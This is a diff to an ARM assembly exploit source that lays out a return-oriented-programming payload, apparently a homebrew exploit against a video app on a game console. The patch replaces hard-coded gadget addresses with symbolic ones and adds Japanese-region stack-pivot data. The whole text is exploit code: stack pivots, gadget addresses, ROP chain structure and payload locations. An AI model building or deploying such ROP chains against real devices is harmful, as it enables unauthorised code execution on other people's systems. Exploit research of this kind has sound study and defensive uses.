@@ -15,6 +15,7 @@
 ; 102c574:       e3a01000        mov     r1, #0
 ; 102c578:       e12fff3c        blx     ip
 ; 
+; YTB_VIRTUAL_TRAMPOLINE
 ; bc07f8:	e5900004 	ldr	r0, [r0, #4]
 ; bc07fc:	e1a06002 	mov	r6, r2
 ; bc0800:	e3500000 	cmp	r0, #0
@@ -37,7 +38,7 @@ PAYLOAD_LOC equ PAYLOAD_PRIM_LOC
 .fill (0x1000 - .), 0xff
 
 .orga 0x0
-	.word 0x00100d84 ; stack_pivot : ldmda r4!, {r2, r3, r6, r9, ip, sp, lr, pc}
+	.word YTB_STACK_PIVOT ; stack_pivot : ldmda r4!, {r2, r3, r6, r9, ip, sp, lr, pc}
 
 .orga 0x10
 	.word PAYLOAD_LOC + 0x40
@@ -50,7 +51,7 @@ PAYLOAD_LOC equ PAYLOAD_PRIM_LOC
 	.word PAYLOAD_LOC + 0x14 
 
 .orga 0x194
-	.word 0x00bc07f8 ; cf above
+	.word YTB_VIRTUAL_TRAMPOLINE ; cf above
 
 .orga 0x200
 	rop:
@@ -67,13 +68,14 @@ PAYLOAD_LOC equ PAYLOAD_PRIM_LOC
 	second_stack_pivot_data:
 	.word YTB_MEMCPY + 0x4 ; skip the stack push because primary payload is read-only, ends in  ldmfd sp!, {r4-r10,lr} ... bx lr | r4
 		.word 0xFFFFFFFF ; r4 (garbage) | r5
-		.word 0xFFFFFFFF ; r5 (garbage) | r9
-		.word 0xFFFFFFFF ; r6 (garbage) | r12
+	second_stack_pivot_data_jpn:
+		.word 0xFFFFFFFF ; r5 (garbage) | r9 or r8
+		.word 0xFFFFFFFF ; r6 (garbage) | r12 or ip
 		.word PAYLOAD_SEC_LOC ; r7 (garbage) | sp
-		.word 0xFFFFFFFF ; r8 (garbage) | lr
+		.word PAYLOAD_LOC + second_stack_pivot_data_jpn ; r8 (garbage) | lr
 		.word YTB_ROP_NOP ; r9 (garbage) | pc
 		.word PAYLOAD_LOC + second_stack_pivot_data ; r10 (stack pivot data ptr)
-	.word 0x00119b84 ; ldm r10!, {r4, r5, r9, r12, sp, lr, pc}
+	.word YTB_STACK_PIVOT2 ; ldm r10!, {r4, r5, r9, r12, sp, lr, pc} (WEST) or ldm r8!, {r8, ip, sp, lr, pc} (JPN)
 
 	.align 0x4
 	payload_secondary:
